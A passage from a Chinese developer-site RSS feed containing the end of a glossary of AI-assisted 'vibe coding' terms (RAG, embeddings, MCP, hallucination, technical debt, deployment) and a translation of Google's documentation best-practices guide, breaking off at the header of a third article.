<li>接口长什么样？</li>
<li>出错怎么处理？</li>
<li>用什么技术栈？ 全写明白，AI 才能精准输出，而不是靠你一句模糊的“做个登录页面”瞎猜。</li>
</ul>
<p>为啥现在越来越多人用 <code>SDD</code>？ 因为大家发现：<strong>AI 写得好不好，不靠 prompt 玩花活，而靠需求清不清楚</strong>。一份好规范，胜过一百条“请认真一点”的提示。</p>
<p>典型流程也很清晰：</p>
<ol>
<li><strong>定原则</strong>：比如“必须响应式”“错误率低于0.1%”</li>
<li><strong>写需求</strong>：用户是谁？要解决什么问题？</li>
<li><strong>问清楚</strong>：让 AI 自己提问题，比如“手机号格式校验要多严？”</li>
<li><strong>做设计</strong>：定架构、<code>API</code>、数据模型</li>
<li><strong>拆任务</strong>：把大活切成小块，标好先后顺序</li>
<li><strong>生成代码</strong>：AI 按任务一项项实现，你只负责验收</li>
</ol>
<p>2025 年 <code>GitHub</code> 还出了个 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgithub%2Fspec-kit" target="_blank" title="https://github.com/github/spec-kit" ref="nofollow noopener noreferrer">Spec Kit</a> 工具包，用 <code>/spec</code>、<code>/plan</code> 这类命令一步步带你走完这套流程，主流 AI 编程工具都支持。</p>
<p>总结一句话：<code>SDD</code> 不是让人类少写代码，而是让 AI 少犯错——<strong>先想透，再动手，才是 AI 时代的高效开发</strong>。</p>
</blockquote>
<h4 data-id="heading-38">RAG 检索增强生成</h4>
<blockquote>
<p>RAG 说白了，就是给 AI 装个“随身资料库”，让它能边查边答，而不是光靠死记硬背。</p>
<p>普通 AI 回答问题全靠训练时学过的东西——就像考试只准用脑子，不能翻书。 但用了 RAG，AI 就像进了考场还能带你的项目文档、代码库、内部 <code>Wiki</code> 当“开卷参考资料”： 它先快速搜一遍你提供的材料，找到相关片段，再结合这些内容生成答案。</p>
<p>在 Vibe Coding 里这招特别管用——比如你要加个新功能，AI 不是凭空瞎写，而是先翻你现有的代码，看你怎么命名、怎么组织逻辑、用什么工具库，然后照着你的风格写出来，<strong>新代码和老代码像一个团队写的</strong>。</p>
<p>一句话：RAG 让 AI 从“凭记忆答题”变成“查你家底干活”，更准、更贴合、更少返工。</p>
</blockquote>
<h4 data-id="heading-39">向量数据库</h4>
<blockquote>
<p>向量数据库，说白了就是个“懂意思”的搜索库。</p>
<p>普通搜索靠关键词匹配——你搜“登录”，就只能找到带“登录”俩字的内容； 但向量数据库先把你的代码、文档转成一串数字（叫“向量”），这串数能代表它的<strong>意思</strong>。</p>
<p>所以当你搜“用户登录”，哪怕某个函数叫 <code>handleAuth</code> 或 <code>verifySession</code>，只要它干的是登录的事，系统也能认出来并找给你——因为它们的“语义”很接近。</p>
<p>在 AI 编程里，这就意味着： AI 能快速翻出项目里<strong>真正相关</strong>的代码片段，哪怕命名风格五花八门、注释写得少，它也能“心领神会”。</p>
<p>相当于给你的项目装了个“语义雷达”——不看字面，看意图。</p>
</blockquote>
<h4 data-id="heading-40">嵌入 Embedding</h4>
<blockquote>
<p>嵌入（Embedding）说白了，就是把文字或代码“翻译”成一串数字，这串数字能代表它的<strong>意思</strong>。</p>
<p>比如“用户登录”和 <code>function authenticateUser()</code> 看起来字不一样，但经过嵌入后，它们在数字空间里会离得很近——因为意思差不多。</p>
<p>正是靠这个，向量数据库才能做到“语义搜索”：你搜一个概念，它能找到干同一件事但命名不同的代码。</p>
<p>你不用搞懂它怎么算的，只要记住： <strong>嵌入是让 AI 能“理解意思”而不是“死抠字眼”的底层技术</strong>，也是 RAG、智能代码补全这些功能能跑起来的关键。</p>
</blockquote>
<h4 data-id="heading-41"><code>MCP</code> 模型上下文协议</h4>
<blockquote>
<p><code>MCP</code>（Model Context Protocol）说白了，就是给 AI 世界定了个“通用插口”——就像 USB 之于电脑。</p>
<p>以前，每个工具（比如数据库、<code>Figma</code>、<code>GitHub</code>）都得单独给 AI 写一套对接代码，费时又重复。 现在有了 <code>MCP</code> 这个开放标准，只要工具按这个协议“插上”，<strong>所有支持 <code>MCP</code> 的 AI（比如 Claude Code、Cursor 等）都能直接用它</strong>，不用再一个个适配。</p>
<p>在 Vibe Coding 里，这等于给 AI 开了外挂：</p>
<ul>
<li>接上 <strong><code>Figma MCP</code></strong>，AI 能直接看设计稿，自动生成网页代码；</li>
<li>接上 <strong><code>GitHub MCP</code></strong>，它能自己提 PR、查 issue、同步仓库；</li>
<li>接上 <strong>数据库 <code>MCP</code></strong>，它能查真实业务数据，边分析边写逻辑。</li>
</ul>
<p>关键不是“AI 变聪明了”，而是它终于能<strong>安全、标准地连上你的真实工作环境</strong>。 <code>MCP</code> 不是功能，而是让各种功能能被轻松“即插即用”的底座——从此 AI 不再困在聊天框里，而是真正走进你的开发流。</p>
</blockquote>
<h3 data-id="heading-42">AI 输出相关</h3>
<h4 data-id="heading-43">AI 幻觉</h4>
<blockquote>
<p>AI 幻觉，说白了就是 AI “一本正经地胡说八道”—— 比如给你一个根本不存在的函数名、瞎编某个库的用法，或者信口开河说“这个 <code>API</code> 支持 <code>XXX</code>”，其实压根没有。</p>
<p>这不是它故意骗你，而是大模型天生靠“猜概率”说话：只要听起来合理，哪怕没这回事，它也可能脱口而出。</p>
<p><strong>怎么防？几个土办法很管用：</strong></p>
<ul>
<li><strong>让它交证据</strong>：直接问“这 <code>API</code> 有官方文档吗？发链接看看”；</li>
<li><strong>自己动手查</strong>：别全信，关键地方翻一遍官网或源码；</li>
<li><strong>换个人问</strong>：换个模型（比如从 <code>Claude</code> 换到 <code>GPT</code>）看说法是否一致；</li>
<li><strong>重启对话</strong>：有时候上下文乱了会带偏 AI，新开一个窗口重说需求，反而更准。</li>
</ul>
<p>记住：AI 是个聪明但爱脑补的实习生，<strong>你可以用它的效率，但得守住你的判断</strong>。</p>
</blockquote>
<h4 data-id="heading-44">温度</h4>
<blockquote>
<p>“温度”就是 AI 的“脑洞开关”。</p>
<ul>
<li><strong>温度调低（比如 0.1）</strong> ：AI 变得一本正经、按部就班，输出稳定、靠谱——写代码就该这样，少整花活，别瞎创新。</li>
<li><strong>温度调高（比如 1.0+）</strong> ：AI 开始放飞自我，想法多但容易跑偏，适合聊创意、想点子，但不适合写能跑的代码。</li>
</ul>
<p>所以编程时，一般把温度压低点—— 你不是要一个诗人，而是一个守规矩的程序员。</p>
</blockquote>
<h4 data-id="heading-45">流式输出</h4>
<blockquote>
<p>流式输出，就是 AI 边想边说，字一个一个蹦出来给你看—— 不像以前非得等它憋完一大段才显示。</p>
<p>好处很明显： 你一眼看出它跑偏了（比如开始写错框架、用错 <code>API</code>），<strong>立马点停止</strong>，省时间、省 Token，也少生气。</p>
<p>这就像跟人聊天时对方一句句说，你随时能插话：“打住，不是这个意思！” 而不是等他讲完十分钟小作文，才发现全答错了。</p>
<p>现在主流 AI 编程工具基本都默认开流式，体验更自然，也更可控——毕竟，<strong>快反馈比完美输出更重要</strong>。</p>
</blockquote>
<h3 data-id="heading-46">项目管理概念</h3>
<h4 data-id="heading-47">MVP（最小可行产品）</h4>
<blockquote>
<p>MVP 就是“先做个能用的最小版本，别一上来就想造宇宙”。</p>
<p>核心就一点：<strong>只做最必要的功能，先把核心问题解决掉</strong>。</p>
<p>比如你想做个记账 <code>App</code>，MVP 可能就俩功能：</p>
<ul>
<li>能记一笔花了多少钱</li>
<li>能看到所有记录</li>
</ul>
<p>别的像图表分析、多账户同步、自动分类……统统先砍掉。</p>
<p>好处很明显：</p>
<ul>
<li>一周就能跑起来，不用搞三个月；</li>
<li>马上拿给用户试，看他们到底用不用、卡在哪；</li>
<li>如果没人用，亏的时间也少；如果真有用，再加功能也不迟。</li>
</ul>
<p>说白了，MVP 不是“做简陋”，而是<strong>用最低成本验证你是不是在干一件值得干的事</strong>。</p>
</blockquote>
<h4 data-id="heading-48">迭代开发</h4>
<blockquote>
<p>迭代开发，说白了就是“<strong>先跑起来，再慢慢升级</strong>”。</p>
<p>别想着一口吃成胖子，而是把大项目拆成一个个小版本： 每个周期就干几件事——定个小目标、让 AI 写代码、你测一测、发个可用版、收点反馈、再优化。</p>
<p>在 Vibe Coding 里特别顺手： 你先让 AI 实现最核心的功能（比如“能登录”），跑通了、没问题， 再下一轮加“找回密码”，再下一轮加“第三方登录”…… 一步步来，每步都可控、可测、可停。</p>
<p>这样既避免 AI 一次性搞太复杂而翻车，也让你能及时调整方向—— 毕竟，<strong>跑得快不如跑得稳，改得快才是真敏捷</strong>。</p>
</blockquote>
<h4 data-id="heading-49">重构</h4>
<blockquote>
<p>重构，就是给代码“做整理、不做改动”——功能一模一样，但让它变得更干净、更好懂、更好改。</p>
<p>比如：</p>
<ul>
<li>把重复的几行抽成一个函数</li>
<li>把 <code>a1</code>、<code>tmp</code> 这种名字改成 <code>userEmail</code>、<code>isValid</code></li>
<li>把嵌套八层的 if 拆清爽</li>
<li>把 500 行的大文件切成几个小模块</li>
</ul>
<p>在 Vibe Coding 里，你可以直接让 AI 帮你干这事，比如：“把这段逻辑提取成独立函数，并重命名变量让它更清晰”。</p>
<p>但记住一点：<strong>一次只动一小块，改完马上测</strong>。 别让 AI 一口气“优化”整个项目——看着爽，跑起来崩，反而更难修。</p>
<p>重构不是炫技，是为了让代码活得更久、改得更快。</p>
</blockquote>
<h4 data-id="heading-50">技术债</h4>
<blockquote>
<p>技术债，说白了就是“<strong>现在图快，以后遭罪</strong>”。</p>
<p>比如为了赶上线，你让 AI 生成一段能跑但乱糟糟的代码：逻辑硬编码、没注释、重复一堆…… 当时是快了，但以后每次改功能、修 bug，都得在泥潭里打滚——改一处，崩三处。</p>
<p>这就像刷信用卡：今天爽了，明天连本带利还，越拖利息越高。 AI 写代码尤其容易埋这种雷——它只管“跑通”，不管“好不好改”。</p>
<p>所以得定期<strong>主动还债</strong>：</p>
<ul>
<li>每隔一阵子，挑关键模块让 AI 帮你重构；</li>
<li>别等代码烂到没人敢动才动手；</li>
<li>把“整洁可维护”当成需求的一部分，不是可选项。</li>
</ul>
<p>记住：<strong>省下的那点时间，迟早会以十倍代价还回去</strong>。 别让 AI 帮你堆出一座“屎山”，再聪明的助手也救不了。</p>
</blockquote>
<h4 data-id="heading-51">版本控制</h4>
<blockquote>
<p>版本控制，就是给代码装“后悔药”和“时光机”。</p>
<p>你每改一次代码，它都记下来：谁改的、改了啥、为啥改。 要是 AI 一通操作把项目搞崩了，你不用抓狂重写——<strong>一键退回上个好用的版本就行</strong>。</p>
<p>Git 是干这活儿最常用的工具，<code>GitHub</code> 则是大家存代码、协作的地方。</p>
<p>在 Vibe Coding 里，这玩意儿尤其关键： 你让 AI 大改一通，结果跑不起来？别慌，<code>git checkout</code> 回退一下，世界清净。 甚至可以开个新分支让 AI 随便试，搞砸了也不影响主代码。</p>
<p>说白了：<strong>有版本控制，你才敢放手让 AI 干活；没它，等于蒙眼走钢丝</strong>。</p>
</blockquote>
<h4 data-id="heading-52">部署</h4>
<blockquote>
<p>部署，说白了就是“<strong>把做好的东西搬上线，让人能用上</strong>”。</p>
<p>你本地写完代码，用户可看不见——得把它传到服务器上跑起来。 现在这事比以前简单多了，基本不用自己配服务器，直接用现成平台：</p>
<ul>
<li><strong><code>Vercel</code></strong>：前端、<code>Next.js</code> 项目一键上线，连数据库都能带；</li>
<li><strong><code>Netlify</code></strong>：静态网站、<code>React/Vue</code> 项目秒部署，还送免费域名和 <code>CDN</code>；</li>
<li><strong>Railway / Render</strong>：后端 <code>API</code>、Node/Python 服务扔上去就能跑；</li>
<li>甚至像 <strong><code>Bolt.new</code></strong> 这类零代码工具，点个按钮就自动部署+生成链接。</li>
</ul>
<p>在 Vibe Coding 时代，很多 AI 工具还能自动帮你打包、推送到这些平台——你只管写需求，它连上线都包了。</p>
<p>但记住：<strong>能跑 ≠ 能用</strong>。部署只是第一步，监控、日志、错误处理这些也得跟上。不过至少，现在“上线”这件事，真的不再是个门槛了。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[文档最佳实践（Google 风格指南）]]></title>    <link>https://juejin.cn/post/7602303923170328585</link>    <guid>https://juejin.cn/post/7602303923170328585</guid>    <pubDate>2026-02-03T06:56:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602303923170328585" data-draft-id="7602447286606315529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="文档最佳实践（Google 风格指南）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T06:56:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="暖阳_"/> <meta itemprop="url" content="https://juejin.cn/user/1662117312465406"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            文档最佳实践（Google 风格指南）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1662117312465406/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    暖阳_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:56:08.000Z" title="Tue Feb 03 2026 06:56:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">文档最佳实践（Google 风格指南）</h2>
<p><strong>原文链接</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fdocguide%2Fbest_practices.html" target="_blank" title="https://google.github.io/styleguide/docguide/best_practices.html" ref="nofollow noopener noreferrer">google.github.io/styleguide/…</a></p>
<hr/>
<p>“言简意赅，直抒己见。” —— <a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FThe_Elements_of_Programming_Style" target="_blank" title="https://en.wikipedia.org/wiki/The_Elements_of_Programming_Style" ref="nofollow noopener noreferrer">Brian Kernighan</a></p>
<h3 data-id="heading-1">目录</h3>
<ol>
<li><a href="#1-%E6%9C%80%E5%B0%8F%E5%8F%AF%E8%A1%8C%E6%96%87%E6%A1%A3" title="#1-%E6%9C%80%E5%B0%8F%E5%8F%AF%E8%A1%8C%E6%96%87%E6%A1%A3">最小可行文档</a></li>
<li><a href="#2-%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%90%8C%E6%AD%A5%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3" title="#2-%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%90%8C%E6%AD%A5%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3">与代码同步更新文档</a></li>
<li><a href="#3-%E5%88%A0%E9%99%A4%E5%A4%B1%E6%95%88%E6%96%87%E6%A1%A3" title="#3-%E5%88%A0%E9%99%A4%E5%A4%B1%E6%95%88%E6%96%87%E6%A1%A3">删除失效文档</a></li>
<li><a href="#4-%E5%AE%81%E8%A6%81%E5%A5%BD%E4%B8%8D%E6%B1%82%E5%AE%8C%E7%BE%8E" title="#4-%E5%AE%81%E8%A6%81%E5%A5%BD%E4%B8%8D%E6%B1%82%E5%AE%8C%E7%BE%8E">宁要好，不求完美</a></li>
<li><a href="#5-%E6%96%87%E6%A1%A3%E6%98%AF%E4%BB%A3%E7%A0%81%E7%9A%84%E6%95%85%E4%BA%8B" title="#5-%E6%96%87%E6%A1%A3%E6%98%AF%E4%BB%A3%E7%A0%81%E7%9A%84%E6%95%85%E4%BA%8B">文档是代码的故事</a></li>
<li><a href="#6-%E9%87%8D%E5%A4%8D%E6%98%AF%E9%AD%94%E9%AC%BC" title="#6-%E9%87%8D%E5%A4%8D%E6%98%AF%E9%AD%94%E9%AC%BC">重复是魔鬼</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">1. 最小可行文档</h3>
<p>少量新鲜、准确的文档，胜过一大堆处于各种“半残”状态的“文档”。</p>
<p>写短小、有用的文档。删掉一切不必要的内容，包括过时、错误或冗余的信息。养成习惯，持续打磨和优化每份文档以适配变化中的需求。<strong>文档最好像盆景一样：保持鲜活，并经常修剪。</strong></p>
<p>另见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.agilemodeling.com%2Fessays%2FagileDocumentationBestPractices.htm" target="_blank" title="https://www.agilemodeling.com/essays/agileDocumentationBestPractices.htm" ref="nofollow noopener noreferrer">敏捷文档最佳实践</a>。</p>
<h3 data-id="heading-3">2. 与代码同步更新文档</h3>
<p><strong>在提交代码变更的同一份 CL 里修改文档</strong>。这样文档才能保持新鲜，也是向评审者说明你在做什么的好地方。</p>
<p>好的评审者至少会要求：docstring、头文件、README.md 以及其它相关文档随 CL 一起更新。</p>
<h3 data-id="heading-4">3. 删除失效文档</h3>
<p>失效文档有害：误导读者、拖慢节奏、让工程师沮丧、让团队负责人懈怠，还会为在代码库里留下烂摊子开先例。家里干净，客人多半也会自觉保持干净。</p>
<p>就像任何大扫除一样，<strong>很容易被压垮</strong>。如果文档状况很差：</p>
<ul>
<li>放慢节奏，文档健康是日积月累的事。</li>
<li>先删掉你确定错误的内容，拿不准的先别动。</li>
<li>让整个团队参与，花时间快速扫一遍每份文档，做一个简单决定：保留还是删除？</li>
<li>迁移时默认删除或弃用；掉队的内容总可以再找回来。</li>
<li>反复迭代。</li>
</ul>
<h3 data-id="heading-5">4. 宁要好，不求完美</h3>
<p>文档是一门艺术。没有完美的文档，只有经过验证的方法和审慎的指南。参见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fdocguide%2Fstyle.html" target="_blank" title="https://google.github.io/styleguide/docguide/style.html" ref="nofollow noopener noreferrer">Better is better than best</a>。</p>
<h3 data-id="heading-6">5. 文档是代码的故事</h3>
<p>写出优秀代码并不止于“能编译”甚至“测试覆盖 100%”。写一段机器能懂的东西不难，难的是写出一段人和机器都能懂的东西。作为注重代码健康的工程师，你的使命是<strong>先为人写，再为机器写</strong>。文档是这项能力的重要一环。</p>
<p>工程文档有一整条光谱，从简短的注释到详尽的说明：</p>
<ol>
<li><strong>有意义的命名</strong>：好的命名能让代码自己传达信息，否则这些信息只能写在注释或文档里。这包括各个层级的可命名实体：局部变量、类、文件、目录。</li>
<li><strong>行内注释</strong>：行内注释的主要目的是提供代码本身无法表达的信息，例如<strong>这段代码为什么存在</strong>。</li>
<li><strong>方法与类注释</strong>：
<ul>
<li><strong>方法 API 文档</strong>：头文件 / Javadoc / docstring 中说明方法做什么、怎么用。这类文档是<strong>代码行为契约</strong>。受众是将来会使用和修改你代码的程序员。通常可以要求：这里文档化的行为都应有测试验证。文档应说明：参数、返回值、“坑”或限制、可能抛出的异常或返回的错误。一般不必解释“为什么这样实现”，除非对开发者理解用法有帮助；“为什么”留给行内注释。写方法文档时想得实际一点：“这是一把锤子，用来钉钉子。”</li>
<li><strong>类 / 模块 API 文档</strong>：类或整个文件的头文件 / Javadoc / docstring。简要概述类/文件做什么，并常附带几个简短使用示例。当类有多种用法（有的简单、有的高级）时，示例尤其有用。<strong>始终把最简单的用法写在最前面。</strong></li>
</ul>
</li>
<li><strong>README.md</strong>：好的 README.md 能帮新用户快速了解该目录，并指向更详细的说明和用户指南：
<ul>
<li>这个目录打算放什么？</li>
<li>开发者应先看哪些文件？有没有是 API？</li>
<li>谁在维护这个目录，哪里可以了解更多？
参见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fdocguide%2FREADMEs.html" target="_blank" title="https://google.github.io/styleguide/docguide/READMEs.html" ref="nofollow noopener noreferrer">README.md 指南</a>。</li>
</ul>
</li>
<li><strong>docs 目录</strong>：好的 docs 目录应说明如何：
<ul>
<li>上手使用相关 API、库或工具。</li>
<li>运行测试。</li>
<li>调试输出。</li>
<li>发布产物。</li>
</ul>
</li>
<li><strong>设计文档、PRD</strong>：好的设计文档或 PRD 会详细讨论拟议实现，以便收集对设计的反馈。但代码实现后，设计文档应作为这些决策的<strong>档案</strong>，而不是半对半错的“活文档”（后者常被误用）。</li>
<li><strong>其它外部文档</strong>：有些团队在代码库之外维护文档（如 Google Sites、Drive、wiki）。若你也在别处维护文档，应在项目目录里<strong>明确指向</strong>这些位置（例如在项目的 <code>README.md</code> 里加上醒目的链接）。</li>
</ol>
<h3 data-id="heading-7">6. 重复是魔鬼</h3>
<p>不要为通用的技术或流程另写一份自己的指南，<strong>链到已有文档即可</strong>。若指南不存在或严重过时，向对应目录提交更新，或写一份包级 README.md。<strong>主动负责、不必害羞</strong>：其它团队通常会很欢迎你的贡献。</p>
<p>本站为开源项目。<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fstyleguide%2Fedit%2Fgh-pages%2Fdocguide%2Fbest_practices.md" target="_blank" title="https://github.com/google/styleguide/edit/gh-pages/docguide/best_practices.md" ref="nofollow noopener noreferrer">改进本页</a>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 工具调用流式开发，TokenStream 才是正确选择]]></title>    <link>https://juejin.cn/post/7602191709388619818</link>    <guid>https://juejin.cn/post/7602191709388619818</guid>    <pubDate>2026-02-03T04:36:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602191709388619818" data-draft-id="7602201748229570579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 工具调用流式开发，TokenStream 才是正确选择"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T04:36:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XuCoder"/> <meta itemprop="url" content="https://juejin.cn/user/948203954903908"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 工具调用流式开发，TokenStream 才是正确选择
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/948203954903908/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XuCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:36:15.000Z" title="Tue Feb 03 2026 04:36:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
